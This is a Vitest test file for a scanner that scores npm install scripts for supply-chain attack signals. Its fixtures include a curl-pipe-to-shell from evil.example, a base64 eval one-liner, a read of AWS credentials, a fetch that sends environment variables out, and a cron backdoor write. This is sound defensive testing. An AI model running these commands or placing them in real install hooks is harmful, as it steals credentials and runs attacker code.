import { describe, expect, it } from 'vitest';
import { extractScripts, rankScripts, scoreScript, type InstallScript } from '../scripts.js';

const script = (command: string, stage: InstallScript['stage'] = 'postinstall'): InstallScript => ({
  packageName: 'example',
  version: '1.0.0',
  stage,
  command,
});

/**
 * These rules are the module's answer to the fact that `event-stream`,
 * `ua-parser-js` and `node-ipc` were all advisory-clean at install time. The
 * payload shapes below are modelled on what those incidents actually did:
 * fetch remote code, decode a blob, read credentials, probe geolocation.
 *
 * The negative cases matter as much as the positive ones — a rule set that
 * flags every `tsc -b` gets switched off within a week, and a switched-off
 * scanner detects nothing.
 */
describe('install-script scoring', () => {
  it('flags a download piped into a shell', () => {
    const verdict = scoreScript(script('curl -s https://evil.example/x.sh | sh'));
    expect(verdict.signals.map((s) => s.rule)).toContain('curl-pipe-shell');
    expect(verdict.severity).toBe('critical');
  });

  it('flags an encoded payload run through an interpreter', () => {
    // The ua-parser-js shape: an inline one-liner decoding a blob.
    const verdict = scoreScript(
      script('node -e "eval(Buffer.from(\'aGVsbG8=\',\'base64\').toString())"'),
    );
    const rules = verdict.signals.map((s) => s.rule);
    expect(rules).toContain('encoded-payload');
    expect(rules).toContain('inline-interpreter');
    expect(rules).toContain('obfuscation');
    expect(verdict.severity).toBe('critical');
  });

  it('flags credential paths and environment exfiltration', () => {
    expect(scoreScript(script('cat ~/.aws/credentials')).signals.map((s) => s.rule)).toContain(
      'credential-path',
    );
    const exfil = scoreScript(
      script('node -e "fetch(\'https://x.example\',{body:JSON.stringify(process.env)})"'),
    );
    expect(exfil.signals.map((s) => s.rule)).toContain('env-exfiltration');
    expect(exfil.severity).toBe('critical');
  });

  it('flags a geolocation probe', () => {
    // node-ipc keyed its destructive payload on host location.
    const verdict = scoreScript(script('curl -s https://api.ipinfo.io/json'));
    expect(verdict.signals.map((s) => s.rule)).toContain('geolocation-probe');
  });

  it('flags writes outside the package and persistence attempts', () => {
    const verdict = scoreScript(script('echo "* * * * * sh /tmp/x" > /etc/cron.d/backdoor'));
    expect(verdict.signals.map((s) => s.rule)).toContain('writes-outside-package');
  });

  it('stays quiet on ordinary build scripts', () => {
    for (const command of ['tsc -p tsconfig.json', 'npm run build', 'husky install', 'echo done']) {
      expect(scoreScript(script(command)).score, command).toBe(0);
    }
  });

  it('discounts known native-build tooling without clearing it', () => {
    const verdict = scoreScript(script('node-gyp rebuild'));
    const plain = scoreScript(script('some-tool rebuild'));
    expect(verdict.score).toBeLessThan(plain.score + 5);
    // Crucially it is discounted, not excluded: hiding behind node-gyp is
    // exactly what an attacker would do, so any signals stay attached.
    if (verdict.signals.length > 0) {
      expect(verdict.signals.some((s) => s.rule === 'known-build-tool')).toBe(true);
    }
  });
});

describe('extractScripts', () => {
  it('pulls every install-time stage, ignoring other scripts', () => {
    const found = extractScripts({
      name: 'thing',
      version: '2.0.0',
      scripts: {
        preinstall: 'echo a',
        postinstall: 'echo b',
        test: 'vitest',
        build: 'tsc',
      },
    });
    expect(found.map((s) => s.stage).sort()).toEqual(['postinstall', 'preinstall']);
    expect(found[0]?.packageName).toBe('thing');
  });

  it('handles a manifest with no scripts at all', () => {
    expect(extractScripts({ name: 'x', version: '1.0.0' })).toEqual([]);
    expect(extractScripts({ name: 'x', version: '1.0.0', scripts: { preinstall: '  ' } })).toEqual(
      [],
    );
  });
});

describe('rankScripts', () => {
  it('returns only scoring scripts, worst first', () => {
    const ranked = rankScripts([
      script('tsc -b'),
      script('curl https://x.example/a | bash'),
      script('node -e "require(\'child_process\')"'),
    ]);
    expect(ranked).toHaveLength(2);
    expect(ranked[0]!.score).toBeGreaterThanOrEqual(ranked[1]!.score);
  });
});
